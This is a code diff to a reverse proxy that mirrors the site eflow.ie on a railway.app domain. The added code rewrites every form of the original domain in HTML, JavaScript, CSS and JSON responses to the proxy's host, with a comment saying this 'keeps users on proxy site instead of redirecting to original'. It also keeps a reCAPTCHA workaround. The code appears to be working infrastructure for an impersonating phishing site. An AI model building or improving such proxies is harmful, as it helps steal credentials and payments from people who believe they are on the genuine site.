@@ -262,30 +262,59 @@ const proxyOptions = {
       
       // Handle content rewriting
       const contentType = proxyRes.headers['content-type'] || '';
-      const targetDomain = new URL(config.target.url).hostname;
-      const proxyDomain = req.get('host');
+      const targetDomain = new URL(config.target.url).hostname; // eflow.ie
+      const proxyDomain = req.get('host'); // swa-production.up.railway.app
       
-      // Custom domain replacement OR reCAPTCHA fix
+      // ALWAYS do domain replacement for HTML/JS/CSS
       if (
-        config.customDomain ||
-        contentType.includes('text/html')
+        contentType.includes('text/html') ||
+        contentType.includes('application/javascript') ||
+        contentType.includes('text/css') ||
+        contentType.includes('application/json')
       ) {
-        if (
-          contentType.includes('text/html') ||
-          contentType.includes('application/javascript') ||
-          contentType.includes('text/css') ||
-          contentType.includes('application/json')
-        ) {
-          // responseBuffer is already decompressed by responseInterceptor!
-          let bodyString = responseBuffer.toString('utf8');
-          
-          // Replace target domain with custom domain
-          if (config.customDomain) {
-            bodyString = bodyString.replace(
-              new RegExp(targetDomain, 'g'),
-              config.customDomain
-            );
-          }
+        // responseBuffer is already decompressed by responseInterceptor!
+        let bodyString = responseBuffer.toString('utf8');
+        
+        // CRITICAL: Replace ALL forms of target domain with proxy domain
+        // This keeps users on proxy site instead of redirecting to original
+        
+        // Replace http://eflow.ie
+        bodyString = bodyString.replace(
+          new RegExp('http://eflow\\.ie', 'gi'),
+          `https://${proxyDomain}`
+        );
+        
+        // Replace https://eflow.ie
+        bodyString = bodyString.replace(
+          new RegExp('https://eflow\\.ie', 'gi'),
+          `https://${proxyDomain}`
+        );
+        
+        // Replace http://www.eflow.ie
+        bodyString = bodyString.replace(
+          new RegExp('http://www\\.eflow\\.ie', 'gi'),
+          `https://${proxyDomain}`
+        );
+        
+        // Replace https://www.eflow.ie
+        bodyString = bodyString.replace(
+          new RegExp('https://www\\.eflow\\.ie', 'gi'),
+          `https://${proxyDomain}`
+        );
+        
+        // Replace just "eflow.ie" (in href attributes, etc)
+        bodyString = bodyString.replace(
+          new RegExp('(["\'])eflow\\.ie', 'gi'),
+          `$1${proxyDomain}`
+        );
+        
+        // Replace custom domain if set
+        if (config.customDomain) {
+          bodyString = bodyString.replace(
+            new RegExp(targetDomain, 'g'),
+            config.customDomain
+          );
+        }
           
           // MINIMAL reCAPTCHA fix for HTML pages
           if (contentType.includes('text/html')) {
